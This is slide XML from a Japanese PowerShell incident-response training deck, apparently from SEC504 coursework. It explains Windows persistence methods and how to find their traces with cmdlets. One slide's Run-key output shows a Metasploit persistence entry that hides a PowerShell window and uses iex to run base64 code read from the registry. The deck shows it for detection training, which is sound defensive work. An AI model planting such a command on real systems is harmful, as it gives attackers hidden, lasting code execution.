              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ShortPath</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="92D050"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRP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C:\PROGRA~1\WindowsApps\MIABDE~1.0_X\pwsh.exe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr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CF3F86FB-3258-20A2-5A90-A9BC8F434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2622394"/>
            <a:ext cx="9697091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2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行目の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Select-String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は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Where-Object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で代用できる。</a:t>
            </a:r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5A70FD62-F61B-C244-937D-C30F3FC4D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3665346"/>
            <a:ext cx="10692309" cy="677108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8.3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形式の取得には、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>FileSystemObject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（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COM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オブジェクト）を使う。</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>PowerShell 7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にて、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pwsh.exe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のフルパスを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8.3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形式で取得する例。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8D70880-3A73-23AC-098E-8F258EE50B82}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1343472" y="2994445"/>
            <a:ext cx="5868652" cy="40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&gt;&gt; Where-Object {$_ -like "*pwsh.exe*"} </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42198662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D2EA85FE-FC52-CA9B-A4D8-F6C7CBD34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永続化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55A362B-A218-991D-3EC6-8AE3AD5436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C952BBB-4D8D-31E2-2996-B950700EC8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35</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{34FE14F8-EC97-A16A-3C4D-FEF68E85A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7868" y="4941168"/>
            <a:ext cx="6407830" cy="126014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numCol="3" spcCol="288000">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/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基本事項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プロセス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ネットワーク</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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ファイル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b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>永続化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イベントログ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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環境整備</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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学習案内</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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まとめ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" dirty="0">
              <a:latin typeface="+mn-ea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330712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7CEEB25E-4B30-1845-D633-047CDD46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永続化 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>における永続化手法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8100A5F-3201-20E4-5093-F7520B5362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85C1216-2E6C-E50D-3A31-35FC3EDA4B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36</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1AFC6A70-921F-D014-971A-1C87D6921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893906"/>
            <a:ext cx="10440989" cy="4316566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攻撃者が初期侵入に成功したホストがクライアント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PC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の場合、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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>利用者の再起動やクラッシュによって通信が失われる恐れがある。</a:t>
            </a:r>
          </a:p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endParaRPr lang="ja-JP" altLang="en-US" sz="1000" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p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再起動しても通信を確立させておくために、攻撃者は永続化という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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>手法を用いてホスト内に足場を築く。</a:t>
            </a:r>
          </a:p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endParaRPr lang="ja-JP" altLang="en-US" sz="1000" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p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典型的な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Windows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の永続化手法には、次のようなものがある。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>①自動スタートアップ（レジストリの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Run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キーなど）、</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>②サービス、③スケジュールタスク、④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DLL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乗っ取り、⑤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WMI</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="l"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="34290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次からのスライドでは①②③⑤について、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Metasploit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で永続化した</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>痕跡を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PowerShell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コマンドレットで確認していく。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p: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C9A4F861-5311-C123-C800-56F0D14BE0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76358" y="4869160"/>
            <a:ext cx="1722573" cy="130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5440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DE4F6D-7D4C-A360-D663-685F9F84E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永続化 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>レジストリ</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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30A3F42-ED7A-C944-5FFD-6E33CCBC61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7962795-2DBB-9084-E6B3-EFC4485D8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37</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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9DA13242-9BF2-1045-5BA5-B2AC6DB8A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895941"/>
            <a:ext cx="10512289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Run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キーに登録されている項目を確認する。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4555321-573C-8C64-E64F-1F96EFDE2369}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="897885" y="1234495"/>
            <a:ext cx="10417815" cy="42107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Set-Location -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion 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 Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ChildItem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> | Where-Object {$_.Name -like "*Run*"}</a:t>
            </a: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   Hive: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion</a:t>
            </a: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Name    Property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----    --------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Run     </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>SecurityHealth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>      :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        C:\WINDOWS\system32\SecurityHealthSystray.exe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        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>rBCyCQWN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>            : C:\WINDOWS\system32\cmd.exe /b /c start /b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        /min </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>nop</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -w hidden -c "sleep 0;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        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>iex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>([</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.Text.Encoding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>]::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Unicode.GetString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(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        [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.Convert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>]::FromBase64String((Get-Item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        '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>HKLM:Software</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CYHAbBeQ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>').</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>GetValue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>('7ZjYbkg0'))))"☻</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .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AE0A0D9-934F-6CCB-8A15-0DA82080B636}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2063552" y="3086962"/>
            <a:ext cx="9073008" cy="217824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DFF67DA6-CF6A-AC73-80E4-B41875B55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5502277"/>
            <a:ext cx="9697091" cy="677108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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>ChildItem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のかわりに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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>ItemProperty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 Run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とすれば、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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>緑枠内だけを出力できる。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36095100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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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永続化 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>PSDrive</a:t>
            </a:r>
            <a:endParaRPr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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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38</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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9B032795-243F-FE75-F5D3-2868DB742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895941"/>
            <a:ext cx="10512289" cy="7925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PowerShell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では、レジストリをファイルシステムと同様に扱える。</a:t>
            </a:r>
          </a:p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HKLM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および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HKCU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にはエイリアスが用意され、ドライブのように扱える。</a:t>
            </a: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0033EA45-FAA0-CBF3-8DE9-35FFFE1A0EDB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="897885" y="1738551"/>
            <a:ext cx="10417815" cy="4210729"/>
            <a:chOff x="897885" y="1234495"/>
            <a:chExt cx="10417815" cy="4210729"/>
          </a:xfrm>
        </p:grpSpPr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8D426021-5DE3-3ED2-8878-5A83BFDD1220}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="897885" y="1234495"/>
              <a:ext cx="10417815" cy="421072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r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>&gt; Get-</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>PSDrive</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>Name     Used (GB) Free (GB) Provider    Root             </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>CurrentLocation</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>----     --------- --------- --------    ----             ---------------</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>Alias                        </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>Alias</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>C            26.96     13.03 </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>FileSystem</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>  C:\                 Users\Sec504</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>Cert                         Certificate \</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>D                            </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>FileSystem</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>  D:\</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>Env                          Environment</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>Function                     </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>Function</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>HKCU                         Registry    HKEY_CURRENT_USER</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>HKLM                         Registry    HKEY_LOCAL_MACHINE</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>Variable                     </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>Variable</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>WSMan</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>                        </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>WSMan</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp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11C2467F-7CC9-EE3B-43BC-3643BE4E8980}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="911424" y="4149080"/>
              <a:ext cx="8640960" cy="684076"/>
            </a:xfrm>
            <a:prstGeom prst="rect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lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4D4D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75854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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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永続化 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>サービス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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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39</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="2" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{61018E5C-8A96-8714-DA0A-555F6AD7E9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097881"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8688288" y="784163"/>
          <a:ext cx="2628292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4731">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130588"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="743561">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="25036936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Cmdlet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Alias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14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Get-Service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gsv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370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Stop-Service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spsv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056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Start-Service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dirty="0" err="1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sasv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033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i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Restart-Service</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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 i="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44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i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Suspend-Service</a:t>
                      </a:r>
